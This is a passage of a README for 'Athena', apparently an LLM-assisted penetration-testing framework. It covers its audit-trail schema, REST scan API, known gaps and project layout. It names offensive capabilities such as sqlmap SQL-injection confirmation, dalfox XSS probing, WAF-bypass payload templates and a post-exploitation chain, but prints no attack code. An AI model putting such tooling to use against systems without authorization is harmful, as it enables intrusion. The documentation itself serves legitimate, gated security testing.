The HTML report adds severity summary cards, a severity distribution bar, technology lists, per-vulnerability tables, remediation recommendations, and a compliance audit section.

---

## Logging & auditability

Every security-relevant action is auditable: sensitive modules emit **structured operation events** (one JSON line per event) to the dedicated audit trail (`athena_audit.log`), with all required accountability fields:

| Field | Meaning |
|---|---|
| `operator` | Human or service operator performing the action |
| `engagement_id` | Engagement the action belongs to |
| `target` | Resource acted upon (host, URL, stage key, artifact path) |
| `module` | Emitting module (`operation_control`, `orchestration`, `cleanup_manager`, `cli`, …) |
| `action` | Short action code (`OPERATION_DENIED`, `STAGE_RUN`, `ARTIFACT_CLEANUP`, `PIPELINE_START`, …) |
| `timestamp` | ISO-8601 UTC |
| `result` | Outcome (`COMPLETED`, `FAILED`, `DENIED`, `VERIFIED`, …) |
| `authorization_decision` | Gate outcome (`AUTHORIZED`, `DENIED`, `REQUIRES_AUTHORIZATION`, `PENDING`) |
| `scope_decision` | Scope gate outcome (`in_scope`, `blocked_by_scope`, `unverified`) |
| `evidence_ref` | Evidence / operation / artifact reference (operation plan id, produced artifacts, error code) |
| `details` | Free-text context |

Who emits what:

- **`OperationGate`** (`modules/operation_control.py`) — every authorization attempt, denial, confirmation request and completed/failed operation carries the engagement id, the authorization decision and the scope decision.
- **`PipelineOrchestrator`** (`modules/orchestration.py`) — every stage run (`STAGE_RUN`) records the stage key as target, the final stage state as result, the derived authorization/scope decisions, and the produced artifacts or error code as evidence.
- **`CleanupManager`** (`modules/cleanup_manager.py`) — artifact registration and verified cleanup events.
- **CLI pipeline runs** (`athena.py`) — `PIPELINE_START` / `PIPELINE_END` events bound to the resolved engagement.

The audit trail is readable back for inspection:

```python
from modules.logging_config import AuditLogger, audit_operation

audit = AuditLogger(audit_file='athena_audit.log')
trail = audit.read_trail(limit=50, action='STAGE_RUN')   # newest last
for event in trail:
    print(event['target'], event['result'],
          event['authorization_decision'], event['scope_decision'])
```

Modules emit through the `audit_operation` helper, which writes the full schema when the backend supports it (`log_operation`) and falls back to a compatible `log_action` event for legacy audit backends. Audit failures never break operations — recording is best-effort by design, and the audit logger never propagates to the root logger so compliance records cannot be filtered or swallowed.

---

## REST API server

Start the API server:

```powershell
python athena.py --api            # or python athena.py -m 4
```

Configuration is read from `.env`/env vars: `SERVER_HOST` (default `0.0.0.0`), `SERVER_PORT` (default `5000`), `HTTPS_ENABLED` (serves HTTPS when `cert.pem`+`key.pem` exist, otherwise falls back to HTTP), `REQUIRE_API_KEY` (default `true`), `ATHENA_API_KEY`, `MAX_TARGETS_PER_REQUEST` (default `10`), `RATE_LIMIT_SCAN` (default `5 per minute`).

Endpoints:

| Endpoint | Auth | Description |
|---|---|---|
| `GET /health` | No | Health / safe-mode / active-scan count |
| `GET /metrics` | No | Prometheus text metrics |
| `POST /scan` | `X-API-KEY` | Queue a background scan (`target` string/list, `mode` `1`/`2`/`3`) → `202` + `job_id` |
| `GET /scan/status/<job_id>` | `X-API-KEY` | Job status (`QUEUED`/`RUNNING`/`COMPLETE`/`FAILED`) |
| `POST /scan/url` | `X-API-KEY` | Synchronous single-URL vulnerability probe |
| `GET /jobs` | `X-API-KEY` | List in-process jobs |
| `GET /apidocs/` | No | Simple endpoint reference |

All responses include mandatory security headers; `/scan` and `/scan/url` are rate-limited per API key + IP.

---

## What is missing / known gaps

The following items are **documented but incomplete** in the current codebase:

1. **DONE (v1.0.0): content-discovery wordlist shipped.** `common_files.txt` (~95 curated paths) is loaded by `modules/hidden_asset_scanner.py` (`load_path_wordlist()`/`active_paths()`), honouring `FrameworkConfig.DEFAULT_WORDLIST` (env `DEFAULT_WORDLIST`); missing file falls back to the built-in list.

2. **Chrome extension is untested against a real server.** `extension/` expects the Flask server on `http://127.0.0.1:5000` (now implemented — start it with `python athena.py --api`).

3. **Stale artifacts in the repo root.** `aethelred_structured.jsonl.5` (~20 MB), old `report_*.json` files, and zero-byte `aethelred.log` are not covered by `.gitignore` (the `.jsonl` pattern doesn't match the `.5` suffix) and shouldn't be committed.

4. **Docs drift.** `docs/USER_GUIDE.md` and `docs/API_REFERENCE.md` describe API behavior that was implemented in the current codebase but should be verified against it (e.g. rate-limit values, `--api` defaults). `.env.example` still mixes unused API settings.

### Omega-era gaps (verified 2026-10-15 on a live ModSecurity host — implement one day)

5. **Chromium deferred (data budget).** `playwright` installs, but the ~170 MB browser download is intentionally skipped on metered links — every run logs `Headless crawl skipped` until the operator runs `playwright install chromium` with data to spare. Detection, auth, and vuln scanning are unaffected; `run_coverage_stage` picks Chromium up automatically once present.

6. **DONE (v1.0.0, hardened 2026-10-16): sqlmap installed.** `python scripts/install_tools.py --only sqlmap` fetched the engine; `run_extended_tools` now confirms SQLi (bounded: 1 URL, level 1/risk 1, 150s, direct `sys.executable + sqlmap.py` launch so the `.cmd` shim can never break it). Re-run the installer after moving machines.

7. **Gemini auth-key format (post May-2026).** Google AI Studio now issues auth keys (`AQ.Ab...`) instead of `AIza...` standard keys; unrestricted standard keys are rejected. Athena accepts both formats and lets the API decide (`configured_providers()`), but an unrestricted/orphaned key still fails with an empty `LLM call failed (gemini):` line. Fix: AI Studio → key → **Restrict to Gemini API only** + enable `generativelanguage.googleapis.com`. Until then Groq-only (`providers: ['groq']`) is the correct working state.

8. **Single-LLM rate limits on big scans (optional keys documented).** Groq free tier 429s after ~70 findings (`rate limited 3x; cooling down 60s`), leaving AI triage degraded. Deterministic dedup still runs, but narratives/flagging thin out. Optional, data-free fixes now in `.env.example`: `DEEPSEEK_API_KEY` as second failover, `NVD_API_KEY` (50 req/30s vs 5/30s) to cut keyword-fallback CVE noise.

9. **Dalfox vs WAF tarpitting (contained 2026-10-16).** `dalfox ... timed out after 90s` on tarpit hosts (ModSecurity holds the connection open) prints `[*] ... skipped as inconclusive`, skips the host's later URLs, and stops the fan-out after two timeouts so Phase 3 is never stalled. R-only dalfox output (exit 1, e.g. `/webmail/login`) is a clean `0 XSS` miss, never a scary `[!]` line. Timeouts stay inconclusive-by-wait, not proof of absence.

10. **DONE (v1.0.0): Restricted-Technique confirmation UI in CLI.** `--confirm-dangerous` prompts interactive Allow/Deny per tool wave (nuclei, sqlmap/dalfox/wafw00f/httpx, automated exploitation); declined waves are recorded as `skipped` in reports. Default off so agents, API mode, and CI stay non-interactive.

### Recently Added Features

5. **AI Integration** — Gemini-powered analysis for finding correlation, prioritization, attack-path reasoning, and report generation. Requires `GEMINI_API_KEY` environment variable.

6. **Finding Correlation** — Cross-module deduplication, relationship detection, and impact aggregation. Works deterministically without AI; AI can enhance results when enabled.

7. **Rate Limiting** — Per-engagement rate limiting with sliding window, burst control, and violation tracking. Integrates with the REST API server.

8. **Pipeline Orchestration** — 11-stage PTES-aligned pipeline with independent stage execution, failure isolation, structured states, and artifact hand-off (`--list-stages`, `--stage`, `--preflight`).

9. **Operator Control** — Fail-closed `OperationGate` with preflight explanations, scope/technique/confirmation gating, audit, rate limits, and verified cleanup registration.

10. **Multi-provider AI with failover** — Gemini/Groq/DeepSeek with automatic failover (`last_provider`).

### Orchestration seams (stages without autonomous modules)

The pipeline's **control stages** are fully implemented (gating, isolation, artifact contracts, dependency handling), but do not yet run autonomous modules. Running them reports a structured `STAGE_NOT_IMPLEMENTED` error instead of executing — this is deliberate, not a crash:

- `engagement`, `recon`, `validation`, `initial_access`, `post_exploitation_assessment`, `attack_path_analysis`, `impact_assessment`

Module-backed stages that run real work today: `discovery`, `enumeration`, `scanning`, `reporting`.

---

## Project layout

```
athena/
├── athena.py              # CLI entry point + scan orchestrator
├── requirements.txt
├── run.bat                # Windows wrapper
├── Dockerfile             # runs the REST API server (`CMD ["--api"]`)
├── .env.example           # configuration template
├── config/payloads.json   # WAF-bypass & payload templates
├── modules/               # core framework modules
│   ├── ai_integration.py      # Multi-provider LLM (failover): correlation, prioritization, attack paths
│   ├── finding_correlation.py # Cross-module dedup, relationship detection
│   ├── rate_limiter.py        # Per-engagement rate limiting
│   ├── orchestration.py       # 11-stage pipeline, StageState, StructuredError
│   ├── operation_control.py   # OperationGate: preflight, authorization, gating
│   ├── cleanup_manager.py     # Verified temporary-artifact cleanup
│   ├── post_exploitation/     # 7-phase post-exploitation chain
│   └── ... (other modules)
├── plugins/               # auto-discovered BasePlugin extensions
├── extension/             # Chrome extension (talks to the REST API server)
├── docs/                  # USER_GUIDE.md, API_REFERENCE.md
├── tests/                 # pytest suite (conftest, api, scanner, post, …)
└── .github/workflows/     # CI (lint / security / test / docker)
```

---

## Development

```powershell
python -m pytest tests/ -v
```

Linting / static checks (as in CI):
```powershell
flake8 athena.py modules/ --max-line-length=140 --ignore=E402,W503,E203
bandit -r athena.py modules/ --skip B101,B307,B311
```

**Test coverage:** 571 tests passing, including:
- `tests/test_ai_integration.py` — AI correlation, prioritization, attack paths, dedup, provider failover
- `tests/test_finding_correlation.py` — Deduplication, relationships, impact aggregation
- `tests/test_rate_limiter.py` — Rate limiting, burst control, violation tracking
- `tests/test_orchestration.py` — Stage registry, structured errors, single-stage + pipeline execution, isolation
- `tests/test_operation_control.py` — Preflight plans, authorization chain, confirmation gating, guarded execution
- `tests/test_cleanup_manager.py` — Verified removal, scrubbing, failure isolation, retry semantics
- `tests/test_audit_operations.py` — Structured audit schema, trail read-back, gate/orchestrator/cleanup audit events

**Implemented in this repo:** the REST API server (`run_web_server`, endpoints from `docs/API_REFERENCE.md`, background job runner `_run_background_scan`, `--api`, numeric mode aliases, `--unsafe`) — covered by `tests/test_api.py` (37 passing tests).
